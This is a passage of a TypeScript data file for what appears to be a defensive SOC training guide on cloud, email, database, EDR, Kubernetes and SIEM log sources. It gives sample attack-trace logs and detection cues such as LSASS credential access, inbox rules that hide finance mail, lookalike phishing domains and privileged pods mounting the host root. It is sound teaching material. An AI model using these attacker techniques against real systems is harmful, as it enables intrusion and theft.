      "Impossible travel, and hosting/VPN ASNs instead of residential ISPs.",
      "<b>Legacy authentication</b> protocols, which bypass MFA entirely.",
      "Many 50126 failures across many accounts from one IP — password spraying.",
      "First-ever sign-in from a new device or country for that user.",
    ],
    scenario:
      "A user reported a DocuSign email; 20 minutes later an impossible-travel alert fired. The sign-in log showed MFA 'satisfied' with <b>no prompt sent</b> — proof the attacker had stolen the session token, so a password reset alone would not have evicted them. We revoked refresh tokens instead.",
  },
  {
    id: 21,
    platform: "cloud",
    level: "l2",
    name: "Microsoft 365 / Exchange audit logs",
    what: "<p>Records mailbox and collaboration activity — inbox rules, mail access, file downloads, sharing, and admin changes. Where a business email compromise becomes visible.</p>",
    where: "<p>Microsoft Purview audit search, or the <code>OfficeActivity</code> table. Ensure <b>mailbox auditing is enabled</b> — historically it was licence-dependent and often silently off.</p>",
    sample:
      'Operation: New-InboxRule\nUserId: jsmith@corp.com\nClientIP: 185.220.x.x\nParameters: Name="..."; SubjectContainsWords="invoice,payment,bank";\n            MoveToFolder="RSS Feeds"; MarkAsRead=True',
    fields:
      "<p><b>Operation</b> is the action name — learn <code>New-InboxRule</code>, <code>Set-Mailbox</code> (forwarding), <code>Add-MailboxPermission</code>, <code>FileDownloaded</code>, <code>FileSyncDownloadedFull</code>, and <code>Add-MemberToRole</code>. Rules that <b>hide</b> mail (move to an obscure folder + mark as read) are almost always malicious.</p>",
    lookFor: [
      "<b>New inbox rules that hide or forward</b> mail matching finance keywords.",
      "External auto-forwarding enabled on a mailbox.",
      "<b>Mass file downloads</b> (hundreds in minutes) — staging for exfiltration.",
      "Mailbox permissions granted to unexpected accounts.",
      "New OAuth application consent grants — they survive password resets.",
    ],
    scenario:
      "After a token-theft compromise, the audit log showed a <code>New-InboxRule</code> moving anything containing 'invoice' or 'payment' into RSS Feeds, marked read — hiding the replies while the attacker emailed our suppliers. That rule was the <b>proof of intent</b> that escalated it to a BEC incident.",
  },
  {
    id: 22,
    platform: "cloud",
    level: "l2",
    name: "AWS CloudTrail",
    what: "<p>Records every API call in the AWS account — who did what, from where, and whether it succeeded. The primary investigation source for anything AWS.</p>",
    where: "<p>CloudTrail console, or (better) the S3 log archive in a separate account queried with Athena. Enable org-wide, multi-region, with log-file validation.</p>",
    sample:
      '{"eventName":"GetCallerIdentity","userIdentity":{"type":"IAMUser","userName":"ci-deploy"},\n "sourceIPAddress":"45.13.x.x","awsRegion":"ap-south-1","eventTime":"2026-07-24T02:41:19Z"}\n{"eventName":"RunInstances","requestParameters":{"instanceType":"p3.8xlarge"},"awsRegion":"ap-south-1"}\n{"eventName":"CreateAccessKey","requestParameters":{"userName":"ci-deploy"}}',
    fields:
      "<p>Read <b>userIdentity</b> (who), <b>eventName</b> (what), <b>sourceIPAddress</b> (from where), and <b>awsRegion</b>. The classic stolen-key sequence is <code>GetCallerIdentity</code> → <code>DescribeRegions</code> → <code>RunInstances</code>. <b>errorCode</b> fields matter too — a burst of AccessDenied is an attacker probing their own permissions.</p>",
    lookFor: [
      "Activity in <b>regions you never use</b>, and expensive instance types.",
      "<code>CreateUser</code> / <code>CreateAccessKey</code> / <code>AttachUserPolicy</code> — persistence and escalation.",
      "<code>StopLogging</code>, <code>DeleteTrail</code>, <code>PutBucketPolicy</code> — defence evasion.",
      "<b>Instance-role credentials used from an IP outside AWS</b> — the clearest credential-theft signal.",
      "A spike of AccessDenied errors from one identity — permission enumeration.",
    ],
    scenario:
      "A key leaked to GitHub was used within 9 minutes. CloudTrail showed the attacker's exact sequence — identity check, region enumeration, then GPU instances in three unused regions, plus a <code>CreateAccessKey</code> for persistence. <b>The mining was noise; the second key was the real risk.</b>",
  },
  {
    id: 23,
    platform: "cloud",
    level: "l2",
    name: "Cloud storage & data-plane access logs",
    what: "<p>Records reads and writes to individual objects — which file was downloaded, by whom. Distinct from control-plane logs, which only show configuration changes.</p>",
    where: "<p>S3 server access logs / CloudTrail data events; Azure Storage diagnostic logs; GCP Data Access audit logs. <b>All are off by default.</b></p>",
    sample:
      'bucket=customer-exports key=2026-07/pii_full.csv operation=REST.GET.OBJECT\nrequester=arn:aws:sts::...:assumed-role/app-role/i-0ab12 remote_ip=45.13.x.x\nbytes_sent=418992301 http_status=200',
    fields:
      "<p><b>operation</b> (GET/PUT/DELETE), <b>requester</b> (the identity, or 'anonymous' for public access), <b>bytes_sent</b>, and <b>http_status</b>. Anonymous GETs against a bucket that should be private is the moment you can prove exposure was <i>used</i>, not just possible.</p>",
    lookFor: [
      "<b>Anonymous or unauthenticated reads</b> on any non-public bucket.",
      "Bulk downloads — a volume spike compared to that identity's baseline.",
      "Reads by an identity that has access but has <b>never used it before</b>.",
      "Cross-account requesters, and access from outside your cloud's IP space.",
    ],
    scenario:
      "A researcher reported a public bucket holding customer data. Only control-plane logging was on, so we could see the ACL change but <b>not whether anyone read the files</b>. Unable to disprove access, Legal had to run a breach notification — an expensive lesson in enabling data-plane logs before you need them.",
  },

  /* ============== APPLICATION & ENDPOINT ============== */
  {
    id: 24,
    platform: "app",
    level: "l1",
    name: "EDR / antivirus telemetry",
    what: "<p>Endpoint agent data: process trees, file and registry activity, network connections, and detections — with the ability to isolate a host and pull artefacts remotely.</p>",
    where: "<p>The EDR console (Defender XDR, CrowdStrike, SentinelOne) and its API/connector into the SIEM.</p>",
    sample:
      "Detection: Credential theft attempt (LSASS access)\nDevice: FIN-WS-114   User: CORP\\jsmith\nProcess tree: explorer.exe → update.exe (unsigned, %TEMP%) → lsass.exe [ACCESS]\nAction: Blocked   Severity: High",
    fields:
      "<p>Read the <b>process tree</b> first — parentage is the fastest judgement you can make. Then check whether the action was <b>blocked or only detected</b>: 'blocked' does not mean 'no impact', because the attacker may have succeeded at earlier steps. Note the <b>signer</b> and <b>path</b> of every binary in the chain.</p>",
    lookFor: [
      "Unsigned binaries running from user-writable paths.",
      "<b>LSASS access</b> by anything that is not a known security tool.",
      "Detections that were <b>allowed</b> or only observed rather than blocked.",
      "The same detection appearing on multiple hosts — spread in progress.",
      "Security agent tampering, exclusions being added, or the agent going offline.",
    ],
    scenario:
      "EDR <i>blocked</i> an infostealer on a developer's machine. Because 'blocked' is not the same as 'in time', we treated every credential on that host as compromised — resets, browser session revocation, and a reimage. Two saved passwords had already been exfiltrated before the block.",
  },
  {
    id: 25,
    platform: "app",
    level: "l1",
    name: "Email gateway & message trace",
    what: "<p>Records mail flow — sender, recipient, subject, attachments, URLs, authentication results, and the delivery verdict. The starting point for every phishing investigation.</p>",
    where: "<p>Secure email gateway console (Proofpoint, Mimecast, Defender for Office 365) and Exchange message trace.</p>",
    sample:
      'from=billing@micros0ft-verify.co  to=jsmith@corp.com\nsubject="Action required: verify your account"\nspf=pass dkim=pass dmarc=pass   (for micros0ft-verify.co)\nverdict=delivered  attachment=none  url="https://micros0ft-verify.co/login"',
    fields:
      "<p><b>SPF/DKIM/DMARC passing proves the sender controls that domain — not that they are trustworthy.</b> An attacker's own lookalike domain will pass all three. Compare the <b>display name against the actual domain</b>, and use message trace to find every other recipient of the same campaign.</p>",
    lookFor: [
      "<b>Lookalike domains</b> — character substitutions (rn/m, 0/o) and newly-registered senders.",
      "Authentication passing for an <b>unfamiliar</b> domain — the classic BEC trick.",
      "Password-protected archives, ISO/IMG attachments, and QR-code-only images.",
      "Replies injected into <b>existing legitimate threads</b> (thread hijacking).",
      "Internal-looking mail that originated externally.",
    ],
    scenario:
      "Accounts payable nearly paid a $180K invoice to changed bank details. Header analysis showed the reply came from a <b>lookalike domain with valid SPF</b> — our tenant was clean; the <i>supplier</i> was compromised. SPF passing was exactly what made it convincing.",
  },
  {
    id: 26,
    platform: "app",
    level: "l2",
    name: "Database audit logs",
    what: "<p>Records queries and administrative actions against the database — who connected, what they queried, and how much data came back. Where insider access and mass extraction show up.</p>",
    where: "<p>SQL Server Audit, MySQL general/audit log, PostgreSQL <code>pgaudit</code>, Oracle audit trail; cloud-managed DB audit logs.</p>",
    sample:
      'time=03:12:44 user=app_reader host=10.14.22.87 db=customers\nstatement="SELECT * FROM customer_pii"  rows_returned=2841993  duration=41s\ntime=03:14:02 user=app_reader statement="SELECT * FROM payment_methods" rows_returned=1204882',
    fields:
      "<p><b>rows_returned</b> is the field that matters most — applications fetch pages of tens or hundreds of rows; <b>millions of rows in one statement is a human or a script dumping the table</b>. Also compare the <b>source host</b> against the app servers that should be connecting.</p>",
    lookFor: [
      "<code>SELECT *</code> against whole tables, especially PII/payment tables.",
      "<b>Row counts far above the application's normal pattern.</b>",
      "Connections from workstations rather than application servers.",
      "Queries outside business hours by accounts that are normally app-driven.",
      "Privilege grants, new DB users, or audit settings being changed.",
    ],
    scenario:
      "A DLP alert flagged a sales engineer uploading files to personal cloud storage. The database audit log showed the source: full-table <code>SELECT *</code> queries against the customer table days earlier, from his workstation rather than an app server — <b>establishing intent and scope</b> for the insider case.",
  },
  {
    id: 27,
    platform: "app",
    level: "l3",
    name: "Container & Kubernetes logs",
    what: "<p>Records cluster control-plane actions (who deployed what, who read secrets) and container runtime behaviour — the cloud-native equivalent of process and auth logging.</p>",
    where:
      "<p>Kubernetes <b>API server audit log</b>, <code>kubectl logs</code> for workloads, and runtime tooling (Falco, Defender for Containers, GuardDuty EKS).</p>",
    sample:
      'verb=create objectRef.resource=pods user=system:serviceaccount:ci:builder\nrequestObject.spec.containers[0].securityContext.privileged=true\nrequestObject.spec.volumes[0].hostPath.path=/\nsourceIPs=["10.14.22.87"]  responseStatus.code=201',
    fields:
      "<p>In the audit log read <b>user</b> (which service account), <b>verb + resource</b> (what action), and the <b>requestObject</b> — where <code>privileged: true</code>, <code>hostPath</code> mounts, and <code>hostNetwork</code> reveal a container that can escape to the node. <code>get secrets</code> by an unexpected identity is credential access.</p>",
    lookFor: [
      "Pods created with <b>privileged: true</b>, hostPath mounts, or the Docker socket.",
      "<code>get</code>/<code>list</code> on <b>secrets</b> by service accounts that never normally read them.",
      "<code>exec</code> into running production pods.",
      "Workloads deployed from <b>untrusted registries</b>, or by unexpected identities.",
      "Runtime alerts for shells spawning inside containers.",
    ],
    scenario:
      "Runtime alerts showed unexpected <code>kubectl</code> activity from inside a pod. The audit log revealed the build pod's service account was bound to <b>cluster-admin</b> and had listed every namespace's secrets. We had to treat every secret it could read as compromised.",
  },
  {
    id: 28,
    platform: "app",
    level: "l2",
    name: "SIEM hygiene — the logs about your logs",
    what: "<p>Meta-monitoring: which log sources are still reporting, at what volume, and with what delay. A silent source is a blind spot that looks perfectly healthy on a dashboard.</p>",
    where: "<p>SIEM health dashboards, connector status pages, and a scheduled query trending events-per-source-per-day.</p>",
    sample:
      "source=WinEventLog:Security   hosts_reporting=1,204 (baseline 1,391)  ▼13%\nsource=proxy_gateway           last_event=41h ago            ⚠ SILENT\nsource=dc03_security           events_today=0 (baseline 480k) ⚠ SILENT",
    fields:
      "<p>Track <b>events per source per day</b> and <b>hosts reporting per source</b> against a baseline. A sudden drop is either a broken connector or an attacker suppressing telemetry — both need investigating. Watch <b>ingestion delay</b> too: alerts that arrive four hours late are not detection.</p>",
    lookFor: [
      "<b>A source that has gone silent</b> — especially domain controllers or the proxy.",
      "A significant drop in reporting hosts for an agent-based source.",
      "Growing ingestion lag, which quietly breaks time-sensitive correlation rules.",
      "Log sources dropped during a licence or cost-cutting exercise and never reinstated.",
    ],
    scenario:
      "A purple team exercise found 6 of 12 emulated techniques produced <b>no alert at all</b>. The rules existed and looked healthy — but the log source they depended on had stopped forwarding weeks earlier. We added log-source health monitoring, because a detection with no data is just a comforting line in a spreadsheet.",
  },
];

export const LOG_COUNT = LOG_SOURCES.length;
export const LOG_PLATFORMS: Platform[] = ["windows", "linux", "network", "cloud", "app"];
